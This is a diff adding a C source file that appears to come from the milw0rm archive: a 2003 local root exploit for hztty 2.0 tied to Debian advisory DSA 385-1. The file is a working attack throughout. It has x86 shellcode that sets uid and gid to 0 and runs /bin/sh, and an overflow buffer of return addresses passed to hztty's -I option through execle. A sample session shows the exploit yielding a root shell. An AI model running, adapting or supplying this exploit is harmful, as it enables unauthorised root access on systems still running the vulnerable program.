@@ -1,0 +1,60 @@
+/*  0x333hztty => hztty 2.0 local root exploit
+ *
+ *
+ *	more info : Debian Security Advisory DSA 385-1
+ *
+ *	*note* I adjusted some part of hztty's code since
+ *	there were some errors. hope this will not influence
+ *	exploitation :> tested against Red Hat 9.0 :
+ *
+ * [c0wboy@0x333 c0wboy]$ gcc 0x333hztty.c -o k
+ * [c0wboy@0x333 c0wboy]$ ./k
+ *
+ *  ---  local root exploit for hztty 2.0  ---
+ *  ---  coded by c0wboy ~ 0x33  ---
+ * 
+ * sh-2.05b# [./hztty started]  [using /dev/ttyp6]
+ * sh-2.05b$ sh-2.05b# uid=0(root) gid=0(root) groups=500(c0wboy)
+ * sh-2.05b#
+ *
+ *  coded by c0wboy 
+ *
+ *  (c) 0x333 Outsiders Security Labs
+ *
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+
+#define BIN    "./hztty"
+#define SIZE   272
+
+
+unsigned char shellcode[] =
+	"\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8"
+	"\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+	"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+	"\xd2\xb0\x0b\xcd\x80" ;
+
+int main()
+{
+	int i;
+	char out[SIZE];
+	char *own[] = { shellcode, 0x0 };
+
+	int *hztty = (int *)(out);
+	int ret = 0xbffffffa - strlen(BIN) - strlen(shellcode);
+
+	for (i=0 ; i<SIZE-1 ; i+=4)
+		*hztty++ = ret;
+
+	hztty = 0x0;
+
+	fprintf (stdout, "\n ---  local root exploit for hztty 2.0  ---\n");
+	fprintf (stdout, " ---  coded by c0wboy ~ www.0x333.org   ---\n\n");
+
+	execle (BIN, BIN, "-I", out, 0x0, own, 0x0);
+}
+
+
+// milw0rm.com [2003-09-21]
